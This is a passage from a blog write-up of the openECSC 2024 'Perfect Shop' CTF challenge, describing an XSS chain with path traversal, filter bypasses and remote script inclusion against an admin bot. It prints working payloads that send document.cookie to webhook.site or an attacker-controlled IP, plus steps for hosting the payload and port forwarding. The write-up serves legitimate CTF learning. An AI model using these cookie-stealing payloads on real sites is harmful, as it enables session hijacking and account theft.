+<p>Of course, starting such a chain (?) means properly handling URL encoding to ensure that the parameters are correctly spread between the POST made to the report endpoint (to which the parameters <code>id</code> and <code>message</code> will be sent) and the request made by the bot to the search endpoint (to which the necessary parameter <code>search</code> and the dummy parameter <code>lol</code> will be sent).</p>
+<p>Once the URL encoding is correctly applied, the result should be this: <code>id=1/../../search%3flol%3d&quot;/admin&quot;%26q%3d&lt;script&gt;window.location%253d&quot;https%253a//webhook.site/[REDACTED]%253d&quot;%252bdocument.cookie&lt;/script&gt;&amp;message=/admin</code>.</p>
+<p>Since it&rsquo;s not excluded by the filter, it will be necessary to bypass the filter also in the report endpoint. To do this, simply add any query parameter with the value <code>/admin</code> or <code>'/admin'</code> in the report URL. In Burp Suite, the final payload will be:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/PayloadNoLenght.png" alt="Final payload without length filter"  />
+</p>
+<p>By doing this, you should again get the flag on the webhook as before. Now there&rsquo;s one last obstacle to overcome&hellip;</p>
+<h4 id="last-step-length-filter-bypass">Last Step: Length Filter Bypass<a hidden class="anchor" aria-hidden="true" href="#last-step-length-filter-bypass">#</a></h4>
+<p>This step didn&rsquo;t require any rocket science. Let&rsquo;s say I simply aimed to find the shortest possible payload with the same philosophy as the previous ones. For completeness, I&rsquo;ll add a subsection with the various things I tried during the competition.</p>
+<h5 id="what-i-tried-during-the-competition">What I Tried During the Competition<a hidden class="anchor" aria-hidden="true" href="#what-i-tried-during-the-competition">#</a></h5>
+<ul>
+<li>
+<p>First of all, I tried several times to exploit <a href="https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html">unicode normalization</a>, with a payload like <a href="https://jlajara.gitlab.io/XSS_20_characters"><code>&lt;script src=//ﬀﬀ.pw&gt;</code></a>, but it seemed useless to me because it wouldn&rsquo;t have allowed me to exfiltrate the cookie (which is absolutely not true) since I wouldn&rsquo;t have been able to append the contents of <code>document.cookie</code>, as the use of <code>src</code> alone wouldn&rsquo;t have allowed me to execute JavaScript code;</p>
+</li>
+<li>
+<p>I tried using <code>onerror</code> like this: <code>&lt;img src/onerror=this.src='https://[IP]/'+document.cookie&gt;</code>, but it still went beyond the allowed 50 characters;</p>
+</li>
+<li>
+<p>I found a way to not specify the protocol, resulting in <code>&lt;img src/onerror=this.src='//[IP]/'+document.cookie&gt;</code>. Still way too long.</p>
+</li>
+<li>
+<p>I tried changing the tag, first with the script tag <code>&lt;script&gt;location='//[IP]/'+document.cookie</code>, where <code>location</code> is a shortcut to access <code>window location</code>, but I realized that the payload wouldn&rsquo;t work unless I closed the tag.</p>
+</li>
+<li>
+<p>Again, this time with <code>&lt;svg onload=location='//[IP]/'+document.cookie&gt;</code>, but with the IP, I would have still exceeded the character limit by a few.</p>
+</li>
+</ul>
+<p>After trying and retrying, convincing myself more and more that I wasn&rsquo;t using the right approach, and scrutinizing the challenge files over and over again, including the templates that I considered completely safe, my eyes fell on the commented Bootstrap CDN.</p>
+<p>What is done with the CDN is to include JavaScript code present on an external server on the page that calls it. To do this, all you need is a reference to this server and a <code>script</code> tag. Eureka.</p>
+<h4 id="xss-rfi">XSS RFI<a hidden class="anchor" aria-hidden="true" href="#xss-rfi">#</a></h4>
+<p>I think I can call it a Remote File Inclusion?</p>
+<p>In the end, the solution was to write your payload to any file. The payload can be as long as you want, the important thing is that the tag that includes the JavaScript code in it is less than 50 characters.</p>
+<p>At this point, I created a file named <code>x.js</code> that would change the page&rsquo;s address to that of my server, like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://webhook.site/[REDACTED]?c=&#34;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>;
+</span></span></code></pre></div><p>At this point, all it took was to send the bot a payload that made it search for <code>&lt;script src='//[IP]:[PORT]/'&gt;&lt;/script&gt;</code>, so that it included the file from my server, executed it, and sent me the flag by changing the page&rsquo;s address from that of the challenge to that of my webhook, including the cookie parameters related to the challenge site as query parameters.</p>
+<h4 id="how-to-expose-your-server-to-the-world">How to expose your server to the world<a hidden class="anchor" aria-hidden="true" href="#how-to-expose-your-server-to-the-world">#</a></h4>
+<p>To expose your files to the rest of the internet, you don&rsquo;t need to physically own a server. Your PC can serve this purpose without much trouble. All you need is Python to do what I did during the competition, so I believe any operating system that supports Python also allows you to expose a server as I&rsquo;m about to show:</p>
+<p>Firstly, you need to get your local IP, which on Linux you can obtain by running the command <code>ifconfig</code>:</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/ifconfig.png" alt="Example of finding local IP with ifconfig"  />
+</p>
+<p>You will likely see an IP starting with <code>192.</code>; here, I tested it on my university&rsquo;s MAN.</p>
+<p>Then, to expose the file containing the payload to the local network, you can use the Python command <code>python3 -m http.server [PORT]</code>. This command sets up a simple HTTP server that exposes all files in the folder and its subfolders where the command was executed. This means that at the URL <code>http://[IP]:[PORT]/x.js</code>, if everything is set up correctly, you should find the payload.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/SimpleHTTPserver.png" alt="Example of a simple HTTP server"  />
+</p>
+<p>Opening it, you should be able to see the payload, which is not being executed. Do not be afraid; when this is included in the script tag, it will be executed as necessary.</p>
+<p>As all good kids know, it&rsquo;s the router that communicates with the fantastic world of the internet, not our device directly, which only receives and sends information via the router. To find out what your external IP address is, you can use an online service like <a href="https://www.whatismyip.com/">whatismyip.com</a>.</p>
+<p>At this point, we have almost everything: we know the IP address where the file to be included in the script tag passed to the bot will be located (i.e., the IP we just found), and we know the port on our device where our files are exposed (after all, we chose it).</p>
+<p>But there&rsquo;s one step missing: the router is reachable from the outside world, but the server hosted on the device is only reachable within the local network. Somehow, we need to tell the router that when a request is received on a certain port, that request should be handled by the Python server.</p>
+<p><a href="https://en.wikipedia.org/wiki/Port_forwarding">Port forwarding</a> allows us to do this. The procedure for enabling it varies greatly depending on the router manufacturer.</p>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/PortForwarding.png" alt="Example of port forwarding"  />
+</p>
+<p>As for the protocol, it&rsquo;s important to select TCP/UDP or similar if available; otherwise, it&rsquo;s better to create a port forwarding table for each protocol.</p>
+<p>The WAN port is the port that will be reachable from the outside, while the LAN port is the port that will receive packets from the outside. Essentially, it&rsquo;s the one chosen when the HTTP server was set up in Python. To avoid errors, I would recommend using the same LAN and WAN port (internal and external) where possible.</p>
+<p>The destination IP is the local IP of the device used, i.e., the one I obtained with <code>ifconfig</code>, or <code>ipconfig</code> in Windows.</p>
+<p>This way, when the router receives a request on the selected WAN port, the packet will be forwarded to the local IP and port entered in the port forwarding table.</p>
+<p>To test that everything has been done correctly, simply visit <code>[public IP of the router]:[WAN port]</code> from any device, preferably not connected to the same local network as the server hosting the exploit (e.g., a phone with mobile data).</p>
+<h3 id="final-payload">Final Payload<a hidden class="anchor" aria-hidden="true" href="#final-payload">#</a></h3>
+<p>Let&rsquo;s make it happen.</p>
+<p>To recap:</p>
+<ul>
+<li>The finalized payload to include the remote JavaScript code is <code>&lt;script src=&quot;//[IP]:[PORT]/x.js&quot;&gt;&lt;/script&gt;</code>.</li>
+<li>The code present on <code>x.js</code> is <code>window.location = &quot;https://webhook.site/[REDACTED]?c=&quot; + document.cookie;</code>.</li>
+<li>All that&rsquo;s left is to send the bot a report like this:</li>
+</ul>
+<p><img loading="lazy" src="/writeups/openecsc-2024/perfect_shop/img/FinalBurp.png" alt="Final Payload in Burp"  />
+</p>
+<p><code>id=1/../../search%3flol%3d&quot;/admin&quot;%26q%3d&lt;script%2bsrc%253d&quot;http%253a//10.10.201.233%253a1337/x.js&quot;&gt;&lt;/script&gt;&amp;message=/admin</code>, which decodes to <code>id=1/../../search?lol=&quot;/admin&quot;&amp;q=&lt;script src=&quot;http://10.10.201.233:1337/x.js&quot;&gt;&lt;/script&gt;&amp;message=/admin</code></p>
+<p>To anyone who managed to read this far, thank you from the bottom of my heart ❤️</p>
+<p>For any feedback, you can reach me out on Discord: <code>titto_caru</code></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
+      <li><a href="http://localhost:1313/tags/ctfs/">CTFs</a></li>
+      <li><a href="http://localhost:1313/tags/openecsc-2024/">Openecsc-2024</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="http://localhost:1313/">Tiziano Caruana</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
